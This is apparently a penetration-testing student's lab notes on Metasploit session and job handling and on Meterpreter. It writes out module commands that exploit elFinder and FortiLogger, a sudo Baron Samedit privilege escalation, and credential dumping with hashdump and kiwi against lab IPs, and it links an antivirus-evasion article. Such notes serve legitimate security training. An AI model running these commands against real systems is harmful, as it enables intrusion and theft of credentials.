- [ ] Session And Jobs
![[Pasted image 20250622215713.png]]
```sh
sessions
sessions -i 2
# jobs
jobs -h
jobs -l
jobs -i 2
jobs -k 2
exploit -j
# challenge
search elFinder 2.1.59
set rhosts 10.129.203.52
set rport 80
set lhost 10.10.14.203
exploit -j
# priv esc
post/multi/recon/local_exploit_suggester
set session 1
run
# run the post exploit
use exploit/linux/local/sudo_baron_samedit
set session 1
set lhost 10.10.14.203
set lport 8444
exploit -j
```
![[Pasted image 20250627142604.png]]
![[Pasted image 20250627142819.png]]
![[Pasted image 20250627145310.png]]
![[Pasted image 20250627145350.png]]
- [ ] Meterpreter
![[Pasted image 20250627145621.png]]
Running Meterpreter!!!!
```
The target executes the initial stager. This is usually a bind, reverse, findtag, passivex, etc.

The stager loads the DLL prefixed with Reflective. The Reflective stub handles the loading/injection of the DLL.

The Meterpreter core initializes, establishes an AES-encrypted link over the socket, and sends a GET. Metasploit receives this GET and configures the client.

Lastly, Meterpreter loads extensions. It will always load stdapi and load priv if the module gives administrative rights. All of these extensions are loaded over AES encryption.

Stealthy |  Powerful  |  Extensible
```
Challenge!!!
```sh
use exploit/windows/http/fortilogger_arbitrary_fileupload
exploit -j
#
hashdump
load kiwi
lsa_dump_sam
lsa_dump_secrets
```
![[Pasted image 20250627223443.png]]
- [ ] References
[ Stageless meterpreter Payloads](https://www.rapid7.com/blog/post/2015/03/25/stageless-meterpreter-payloads/)
[Modifying Metasploit x64 template for AV evasion](https://www.blackhillsinfosec.com/modifying-metasploit-x64-template-for-av-evasion/)